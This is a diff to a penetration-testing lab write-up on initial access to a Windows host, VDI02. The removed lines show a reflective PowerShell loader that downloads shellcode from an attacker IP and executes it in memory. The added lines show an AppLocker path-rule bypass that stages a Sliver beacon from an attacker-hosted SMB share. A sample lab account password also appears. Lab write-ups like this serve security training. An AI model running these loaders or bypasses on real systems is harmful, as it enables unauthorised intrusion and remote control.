@@ -80,17 +80,23 @@ VDI02 instead.
 ## Initial Access — VDI02
 
 The lab grants auto-generated domain accounts (e.g. `caroline.hunter:PenEuIfrit527#`).
-**RDP into VDI02** with a provided account, drop a **Ligolo** agent to route the
-whole `172.16.41.0/24` through it, and enumerate. Beacon/tooling is loaded on
-VDI02 via a reflective PowerShell loader:
+**RDP into VDI02** with a provided account and drop a **Ligolo** agent to route
+the whole `172.16.41.0/24` through it.
 
-```powershell title="Reflective shellcode loader (VDI02)"
-$bytes = (Invoke-WebRequest -Uri "http://10.10.14.8:445/shellcode" -UseBasicParsing).Content
-[Byte[]]$buf = $bytes
-$k = Add-Type -MemberDefinition '[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint b,uint c,uint d);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint b,IntPtr c,IntPtr d,uint e,IntPtr f);' -Name K -Namespace W -PassThru
-$m = $k::VirtualAlloc(0,$buf.Length,0x3000,0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $m, $buf.Length)
-$k::CreateThread(0,0,$m,0,0,0)
+VDI02 enforces **AppLocker**. Enumerating the effective policy shows the default
+`C:\Windows` path rule is intact — anything under it is allowed to execute. So
+generate a Sliver beacon, serve it over SMB from the attacker box, and stage it
+into an allowed path (`C:\Windows\Temp`):
+
+```powershell title="AppLocker bypass — execute from C:\Windows"
+Get-AppLockerPolicy -Effective -Xml    # confirms C:\Windows\* is allowed
+
+# attacker: host the beacon over SMB
+impacket-smbserver share . -smb2support
+
+# on VDI02 — copy into the allowed path and run
+copy \\10.10.14.8\share\beacon.exe C:\Windows\Temp\beacon.exe
+C:\Windows\Temp\beacon.exe
 ```
 
 BloodHound data is collected over LDAP with the provided account (converted with
